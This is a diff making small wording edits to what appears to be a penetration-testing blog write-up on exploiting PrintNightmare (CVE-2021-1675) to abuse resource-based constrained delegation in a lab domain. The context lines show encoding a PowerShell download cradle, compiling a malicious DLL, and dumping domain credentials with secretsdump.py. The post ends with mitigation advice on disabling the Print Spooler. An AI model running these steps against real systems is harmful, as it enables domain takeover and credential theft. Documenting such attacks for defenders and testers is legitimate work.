@@ -144,7 +144,7 @@ $ cat crandle.ps1 | iconv -t UTF-16LE | base64 -w0
 
 [![create-download-cradle.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/create-download-cradle.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/create-download-cradle.png)
 
-I will can put the resulting base64 command into DLL source code and cross-compile it using MinGW:
+I will can put the resulting base64 command into DLL source code and cross-compile it to x64 using MinGW:
 
 ```bash
 $ x86_64-w64-mingw32-gcc pwn.c -o pwn.dll -shared
@@ -160,7 +160,7 @@ I will download and install the modified impacket library within a virtual envir
 
 [![install-impacket.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/install-impacket.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/install-impacket.png)
 
-Note that dynamic `pDriverPath` enumeration feature [was added by cube0x0](https://github.com/cube0x0/CVE-2021-1675/commit/3bad3016aca9a6ebb75e5e687614d1c0d045b1f6) a few hours ago, without it the adversary had to change the script according to the environment:
+Note that dynamic `pDriverPath` (location of the `UNIDRV.DLL` binary) enumeration feature [was added by cube0x0](https://github.com/cube0x0/CVE-2021-1675/commit/3bad3016aca9a6ebb75e5e687614d1c0d045b1f6) a few hours ago, without it the adversary had to change the script according to the environment:
 
 ```powershell
 PS > ls C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_*
@@ -203,4 +203,4 @@ $ secretsdump.py multimaster.megacorp.local -dc-ip 10.10.10.179 -k -no-pass -jus
 
 ## Afterthoughts
 
-The described vulnerability poses enormous risks to active directory infrastructures and must never be used for illegal purposes. To mitigate the risk the Spooler service should be disabled or uninstalled until an official fix is released by vendor. An example on how to stop the Print Spooler can be found [here](https://github.com/gtworek/PSBits/blob/master/Misc/StopAndDisableDefaultSpoolers.ps1).
+The described vulnerability poses enormous risks to active directory infrastructures and must never be used for illegal purposes. To mitigate the risk the Spooler service should be disabled or uninstalled until an official fix is released by vendor. An example on how to disable the Print Spooler can be found [here](https://github.com/gtworek/PSBits/blob/master/Misc/StopAndDisableDefaultSpoolers.ps1).
